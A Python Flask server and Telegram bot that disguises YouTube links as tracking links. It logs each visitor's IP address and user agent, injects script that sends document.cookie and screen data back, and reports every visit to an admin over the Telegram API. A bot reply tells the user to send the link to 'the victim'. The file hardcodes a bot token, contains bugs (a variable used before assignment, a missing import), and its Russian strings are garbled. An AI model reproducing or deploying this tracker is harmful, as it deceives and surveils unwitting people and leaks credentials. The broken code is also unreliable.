import logging
import json
import re
import uuid
import os
import time
import sqlite3
import random
from datetime import datetime
import threading
import base64

# Flask
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS

# Telegram –≤–µ—Ä—Å–∏—è 20.x
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes
)
from telegram.constants import ParseMode

# ========== –ù–ê–°–¢–†–û–ô–ö–ò ==========
BOT_TOKEN = "8342575399:AAFetGCZwKYOe4fwuXLkWsn6N3Q0VVEHGTs"
ADMIN_ID = 1709490182
FLASK_PORT = 5056  # –ò–∑–º–µ–Ω–∏–ª–∏ –Ω–∞ 5056
SERVER_URL = f"http://localhost:{FLASK_PORT}"

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== –ë–ê–ó–ê –î–ê–ù–ù–´–• ==========
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('youtube_data.db', check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS video_links (
                id TEXT PRIMARY KEY,
                youtube_url TEXT,
                youtube_id TEXT,
                server_url TEXT,
                created_at TEXT,
                created_by INTEGER,
                clicks INTEGER DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captured_data (
                id TEXT PRIMARY KEY,
                link_id TEXT,
                timestamp TEXT,
                ip_address TEXT,
                user_agent TEXT
            )
        ''')
        
        self.conn.commit()
    
    def add_video_link(self, youtube_url, server_url, user_id):
        video_id = re.search(r'(?:v=|\/)([a-zA-Z0-9_-]{11})', youtube_url)
        video_id = video_id.group(1) if video_id else "dQw4w9WgXcQ"
        
        link_id = str(uuid.uuid4())[:8]
        
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO video_links 
            (id, youtube_url, youtube_id, server_url, created_at, created_by, clicks)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            link_id,
            youtube_url,
            video_id,
            server_url,
            datetime.now().isoformat(),
            user_id,
            0
        ))
        self.conn.commit()
        return link_id, video_id
    
    def increment_clicks(self, link_id):
        cursor = self.conn.cursor()
        cursor.execute('UPDATE video_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
        self.conn.commit()
    
    def get_link(self, link_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM video_links WHERE id = ?', (link_id,))
        row = cursor.fetchone()
        if not row:
            return None
        columns = [desc[0] for desc in cursor.description]
        return dict(zip(columns, row))
    
    def add_captured_data(self, link_id, ip_address, user_agent):
        data_id = str(uuid.uuid4())[:8]
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO captured_data 
            (id, link_id, timestamp, ip_address, user_agent)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            data_id,
            link_id,
            datetime.now().isoformat(),
            ip_address,
            user_agent
        ))
        self.conn.commit()
        return data_id

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã
db = Database()

# ========== FLASK –°–ï–†–í–ï–† ==========
app = Flask(__name__)
CORS(app)

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>YouTube Tracker</title>
        <style>
            body { font-family: Arial; padding: 50px; text-align: center; }
            input { padding: 10px; width: 300px; margin: 10px; }
            button { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <h1>üé¨ YouTube Data Collector</h1>
        <form action="/create" method="POST">
            <input type="text" name="url" placeholder="YouTube URL" required>
            <br>
            <button type="submit">Create Link</button>
        </form>
    </body>
    </html>
    '''

@app.route('/create', methods=['POST'])
def create_link():
    youtube_url = request.form.get('url', '')
    if not youtube_url:
        return "No URL", 400
    
    link_id, video_id = db.add_video_link(youtube_url, f"{SERVER_URL}/watch?id={link_id}", 0)
    
    return f'''
    <!DOCTYPE html>
    <html>
    <body>
        <h1>‚úÖ Link Created!</h1>
        <p><strong>Original:</strong> {youtube_url}</p>
        <p><strong>Your Link:</strong> {SERVER_URL}/watch?id={link_id}&v={video_id}</p>
        <button onclick="navigator.clipboard.writeText('{SERVER_URL}/watch?id={link_id}&v={video_id}')">
            Copy Link
        </button>
    </body>
    </html>
    '''

@app.route('/watch')
def watch():
    link_id = request.args.get('id', '')
    video_id = request.args.get('v', 'dQw4w9WgXcQ')
    
    if link_id:
        db.increment_clicks(link_id)
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        db.add_captured_data(link_id, ip_address, user_agent)
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
        send_telegram_notification(link_id, ip_address, user_agent)
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <style>
            body {{ margin: 0; padding: 20px; background: #000; }}
        </style>
    </head>
    <body>
        <iframe width="100%" height="500" 
                src="https://www.youtube.com/embed/{video_id}?autoplay=1" 
                frameborder="0" allowfullscreen>
        </iframe>
        <script>
            // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
            const data = {{
                userAgent: navigator.userAgent,
                screen: {{ width: screen.width, height: screen.height }},
                cookies: document.cookie
            }};
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö
            fetch('{SERVER_URL}/collect', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ link_id: '{link_id}', data: data }})
            }});
        </script>
    </body>
    </html>
    '''

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        logger.info(f"Collected data: {data}")
        return jsonify({"status": "ok"})
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({"status": "error"}), 500

def send_telegram_notification(link_id, ip, user_agent):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤ Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        text = f"""
üîî –ù–û–í–´–ô –ü–û–°–ï–¢–ò–¢–ï–õ–¨!

üÜî ID —Å—Å—ã–ª–∫–∏: {link_id}
üåê IP: {ip}
üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: {user_agent[:100]}...
üïí –í—Ä–µ–º—è: {datetime.now().strftime('%H:%M:%S')}
        """
        
        requests.post(url, json={
            "chat_id": ADMIN_ID,
            "text": text,
            "parse_mode": "HTML"
        })
    except Exception as e:
        logger.error(f"Telegram error: {e}")

# ========== TELEGRAM BOT ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "ü§ñ YouTube Data Collector Bot\n\n"
        "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –º–Ω–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ, –∏ —è —Å–æ–∑–¥–∞–º –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º—É—é —Å—Å—ã–ª–∫—É.",
        parse_mode=ParseMode.HTML
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    
    if 'youtube.com' in text or 'youtu.be' in text:
        user_id = update.effective_user.id
        
        # –°–æ–∑–¥–∞–µ–º —Å—Å—ã–ª–∫—É
        link_id, video_id = db.add_video_link(
            text, 
            f"{SERVER_URL}/watch?id={link_id}&v={video_id}",
            user_id
        )
        
        tracking_url = f"{SERVER_URL}/watch?id={link_id}&v={video_id}"
        
        await update.message.reply_text(
            f"‚úÖ –°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞!\n\n"
            f"üé¨ –û—Ä–∏–≥–∏–Ω–∞–ª: {text}\n"
            f"üîó –í–∞—à–∞ —Å—Å—ã–ª–∫–∞: {tracking_url}\n\n"
            f"–û—Ç–ø—Ä–∞–≤—å—Ç–µ —ç—Ç—É —Å—Å—ã–ª–∫—É –∂–µ—Ä—Ç–≤–µ –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö.",
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ.",
            parse_mode=ParseMode.HTML
        )

def run_flask():
    """–ó–∞–ø—É—Å–∫ Flask —Å–µ—Ä–≤–µ—Ä–∞"""
    app.run(host='0.0.0.0', port=FLASK_PORT, debug=False, use_reloader=False)

def run_bot():
    """–ó–∞–ø—É—Å–∫ Telegram –±–æ—Ç–∞"""
    try:
        # –°–æ–∑–¥–∞–µ–º Application
        application = Application.builder().token(BOT_TOKEN).build()
        
        # –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
        application.add_handler(CommandHandler("start", start))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
        print("ü§ñ –ó–∞–ø—É—Å–∫ Telegram –±–æ—Ç–∞...")
        application.run_polling(allowed_updates=Update.ALL_UPDATES)
        
    except Exception as e:
        logger.error(f"Bot error: {e}")

def main():
    print("=" * 50)
    print("ü§ñ YOUTUBE DATA COLLECTOR")
    print("=" * 50)
    print(f"üåê Server: {SERVER_URL}")
    print(f"üöÄ Port: {FLASK_PORT}")
    print(f"üëë Admin: {ADMIN_ID}")
    print()
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º Flask –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # –ñ–¥–µ–º –∑–∞–ø—É—Å–∫–∞ Flask
    time.sleep(2)
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
    run_bot()

if __name__ == '__main__':
    main()
